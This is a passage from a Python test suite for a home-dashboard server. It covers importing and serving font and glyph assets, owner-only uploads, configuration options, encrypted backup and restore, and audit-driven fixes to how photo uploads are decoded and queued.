    out = capsys.readouterr().out
    assert "font_invalid" in out and "font_type_mismatch" in out and "glyphs_invalid" in out
    assert not list((data / "user-files").rglob("*.*")) if (data / "user-files").exists() else True
    # a symlinked file is never followed
    real = tmp_path / "elsewhere.woff2"
    real.write_bytes(dummy_woff2())
    (src / "fonts" / "SF-Pro.woff2").unlink()
    (src / "fonts" / "SF-Pro.woff2").symlink_to(real)
    assert cli_main(["files", "import-assets", str(src), "--data-dir", str(data)]) == 1
    assert "skipped      fonts/SF-Pro.woff2  (not found" in capsys.readouterr().out
    # over the size cap
    big = tmp_path / "big"
    (big / "fonts").mkdir(parents=True)
    (big / "fonts" / "SF-Pro.woff2").write_bytes(dummy_woff2())
    monkeypatch.setattr(uf, "FONT_MAX", 10)
    assert cli_main(["files", "import-assets", str(big), "--data-dir", str(data)]) == 1
    assert "too_large" in capsys.readouterr().out


def test_the_entrypoint_passes_files_import_assets_through_with_the_data_dir():
    import importlib.util
    spec = importlib.util.spec_from_file_location("mantel_entrypoint_files",
                                                  Path(__file__).resolve().parents[1] / "packaging/docker/entrypoint.py")
    ep = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(ep)
    argv, _ = ep.plan(["files", "import-assets", "/imports/hk"], {"MANTEL_DATA_DIR": "/data"})
    assert argv == ["files", "import-assets", "/imports/hk", "--data-dir", "/data"]


async def test_licensed_assets_are_served_with_type_etag_and_only_when_present(mantel, tmp_path):
    m = mantel
    await m.sign_in("jordan")
    for url in ("/hk/fonts/SF-Pro.woff2", "/hk/fonts/SF-Pro.ttf", "/hk/iconset/hk-glyphs.js"):
        assert (await m.client.get(url)).status == 404, url                                 # as today
    src = ha_like_folder(tmp_path, "www/hk")
    assert cli_main(["files", "import-assets", str(src), "--data-dir", str(m.app["cfg"].data_dir)]) == 0
    for url, ctype in (("/hk/fonts/SF-Pro.woff2", "font/woff2"), ("/hk/fonts/SF-Pro.ttf", "font/ttf"),
                       ("/hk/iconset/hk-glyphs.js", "text/javascript")):
        r = await m.client.get(url)
        assert r.status == 200 and r.headers["Content-Type"].startswith(ctype), url
        assert r.headers["Cache-Control"] == "no-cache" and r.headers["X-Content-Type-Options"] == "nosniff"
        again = await m.client.get(url, headers={"If-None-Match": r.headers["ETag"]})
        assert again.status == 304, url
    assert (await m.client.get("/hk/fonts/other.woff2")).status == 404                       # nothing else is served


async def test_an_owner_uploads_both_through_the_slots_and_a_child_cannot(mantel):
    m = mantel
    await m.sign_in("cody")
    assert (await upload(m, "font", dummy_woff2(), "x.woff2", name="SF-Pro.woff2")).status == 403
    assert (await upload(m, "glyphs", official_js(), "hk-glyphs.js")).status == 403
    await m.sign_in("avery")
    r = await upload(m, "font", dummy_woff2(), "Whatever Apple Called It.woff2", name="SF-Pro.woff2")
    assert r.status == 201 and (await r.json())["url"] == "/hk/fonts/SF-Pro.woff2"
    r = await upload(m, "glyphs", official_js(), "glyphs-export.js")
    assert r.status == 201 and (await r.json())["url"] == "/hk/iconset/hk-glyphs.js"
    assert (await (await m.client.get("/api/user-files")).json())["status"] == {"font": True, "glyphs": True}


# -- config ------------------------------------------------------------------------------------------
def test_config_options(tmp_path):
    from mantel_server.config import Config, parse_args
    cfg = parse_args(["--data-dir", str(tmp_path / "d"), "--hk-files", str(tmp_path / "files"),
                      "--backup-target", str(tmp_path / "nas"), "--backup-time", "04:30",
                      "--backup-keep-daily", "9", "--backup-keep-weekly", "2", "--backup-no-files"])
    assert cfg.hk_files == tmp_path / "files" and cfg.user_files_dir == tmp_path / "d" / "user-files"
    assert cfg.backup_target == tmp_path / "nas" and cfg.backup_time == "04:30"
    assert (cfg.backup_keep_daily, cfg.backup_keep_weekly, cfg.backup_include_files) == (9, 2, False)
    default = parse_args([])
    assert default.hk_files == Config.hk_files and default.backup_target is None and default.backup_include_files
    for bad in (["--backup-time", "25:00"], ["--backup-keep-daily", "0"]):
        with pytest.raises(SystemExit):
            parse_args(bad)


def test_uploaded_files_are_inside_the_backup_and_come_back(tmp_path):
    from mantel_server import backup as bk
    from mantel_server import db as dbmod
    data = tmp_path / "data"
    dbmod.Database(data / "mantel.db").close()
    store = uf.UserFiles(data / "user-files")
    store.add_font("SF-Pro.woff2", dummy_woff2())
    store.add_glyphs(official_js())
    photo = store.add_photo(picture("JPEG"))
    nas = tmp_path / "nas"
    nas.mkdir()
    key = os.urandom(32)
    out = bk.create_backup(data, nas, key)
    fresh = tmp_path / "fresh"
    assert bk.restore(out, key, fresh).files == 3
    again = uf.UserFiles(fresh / "user-files")
    assert again.listing()["status"] == {"font": True, "glyphs": True}
    assert again.photo_path(photo["id"]).read_bytes() == store.photo_path(photo["id"]).read_bytes()


def test_a_multi_picture_jpeg_from_a_phone_is_a_jpeg():
    """Many phones and cameras write MPO (a JPEG with extra pictures); Your Files refused it as "does not match its
    own format" while Mantel Photos took it."""
    from PIL import Image

    from mantel_server.user_files import reencode_photo
    im = Image.new("RGB", (64, 48), (10, 120, 200))
    raw = io.BytesIO()
    im.save(raw, "MPO", save_all=True, append_images=[im])
    assert Image.open(io.BytesIO(raw.getvalue())).format == "MPO"
    out, kind = reencode_photo(raw.getvalue())
    assert kind == "jpeg" and Image.open(io.BytesIO(out)).format == "JPEG"


# -- the second audit (2026-10): what a big picture costs the rest of the house ------------------------------------------
async def test_a_large_your_files_photo_upload_does_not_freeze_the_event_loop(tmp_path):
    """MED-1 (audit, second pass): ``reencode_photo`` ran in a worker thread, yet the event loop stood still 0.7 s for
    a 40 MP picture: ``save(..., optimize=True, progressive=True)`` holds the GIL for the whole JPEG encode (see
    test_photos.py). It runs in the image worker process now (imaging.py), progressive again, and the loop never
    waits on it."""
    from mantel_server import imaging
    from test_photos import least_gap, noisy_jpeg
    store = uf.UserFiles(tmp_path / "files")
    await imaging.run(uf.reencode_photo, noisy_jpeg(0.1))          # the worker's start is not what is measured
    data = noisy_jpeg(40)
    got = []

    async def upload():
        got.append(await uf.stage_photo(store, data))
    gap = await least_gap(upload)
    write, result = got[-1]
    write()
    with Image.open(store.photo_path(result["id"])) as im:
        assert im.info.get("progressive") == 1
    assert gap < 0.02, f"the event loop stood still for {gap * 1000:.0f} ms"


async def test_your_files_photo_uploads_queue_with_mantel_photos_for_the_decoder(monkeypatch, image_threads):
    """MED-2 (audit, second pass): ``_in_thread`` took any number of photo uploads at once, each a full decode. A
    photo upload now takes its turn in the same slots as Mantel Photos' (``photos.image_slot``)."""
    from mantel_server import photos
    lock, now, peak = threading.Lock(), [0], [0]

    def slow():
        with lock:
            now[0] += 1
            peak[0] = max(peak[0], now[0])
        time.sleep(0.05)
        with lock:
            now[0] -= 1

    await asyncio.gather(*[uf._in_thread(slow, heavy=True) for _ in range(5)],
                         photos.run_image_job(slow), photos.run_image_job(slow))
    assert peak[0] <= photos.IMAGE_JOBS


def test_a_jpeg_is_decoded_at_the_size_it_is_kept_not_in_full(monkeypatch):
    """MED-2 (audit, second pass): ``reencode_photo`` decoded every JPEG in full, then shrank it. libjpeg can decode
    at 1/2, 1/4 or 1/8 size for a fraction of the memory when the result is still no smaller than PHOTO_EDGE, so the
    JPEG asks for that (``draft``; it can only bite when both sides are 2x the edge, i.e. a 59 MP picture here); the
    kept picture is the same size as before."""
    from PIL import JpegImagePlugin
    seen = []
    real = JpegImagePlugin.JpegImageFile.draft

    def spy(self, mode, size):
        got = real(self, mode, size)
        seen.append((mode, size, self.size))                 # what it asked, and the size the decoder will give
        return got

    monkeypatch.setattr(JpegImagePlugin.JpegImageFile, "draft", spy)
    raw = io.BytesIO()
    Image.new("RGB", (7680, 7680), (10, 120, 200)).save(raw, "JPEG")
    out, kind = uf.reencode_photo(raw.getvalue())
    assert kind == "jpeg" and seen[0] == ("RGB", (uf.PHOTO_EDGE, uf.PHOTO_EDGE), (3840, 3840))   # half size, still >= 3840
    assert Image.open(io.BytesIO(out)).size == (3840, 3840)
    seen.clear()
    png = io.BytesIO()
    Image.new("RGB", (64, 48)).save(png, "PNG")
    uf.reencode_photo(png.getvalue())
    assert seen == []                                        # only a JPEG can be drafted
